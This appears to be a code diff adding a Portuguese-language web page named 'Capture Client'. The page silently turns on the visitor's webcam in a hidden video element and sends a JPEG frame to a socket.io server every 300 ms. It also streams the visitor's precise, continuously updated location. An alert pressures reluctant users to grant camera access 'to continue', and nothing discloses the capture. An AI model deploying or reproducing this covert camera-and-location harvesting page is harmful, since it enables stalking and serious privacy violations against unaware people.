@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<title>Capture Client</title>
+</head>
+<body>
+<video id="video" autoplay playsinline style="display:none"></video>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io({query:{role:'client'}});
+
+/* ---------- câmera ---------- */
+(async ()=>{
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:false});
+    document.getElementById('video').srcObject = stream;
+
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+
+    /* envia um frame a cada 300 ms */
+    setInterval(async ()=>{
+      try{
+        const bitmap = await imageCapture.grabFrame();
+        const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(bitmap,0,0);
+        const blob = await canvas.convertToBlob({type:'image/jpeg', quality:0.6});
+        const dataURL = await blobToDataURL(blob);
+        socket.emit('frame', dataURL);
+      }catch(err){}
+    },300);
+
+  }catch(err){
+    alert('Permita o acesso à câmera para continuar.');
+  }
+})();
+
+function blobToDataURL(blob){
+  return new Promise(r=>{
+    const fr = new FileReader();
+    fr.onload = ()=>r(fr.result);
+    fr.readAsDataURL(blob);
+  });
+}
+
+/* ---------- localização ---------- */
+if('geolocation' in navigator){
+  navigator.geolocation.watchPosition(pos=>{
+    socket.emit('location',{
+      lat      : pos.coords.latitude,
+      lon      : pos.coords.longitude,
+      accuracy : pos.coords.accuracy,
+      timestamp: pos.timestamp
+    });
+  }, err=>{
+    console.warn('Sem localização:', err.message);
+  }, {enableHighAccuracy:true, maximumAge:5000, timeout:10000});
+}
+</script>
+</body>
+</html>
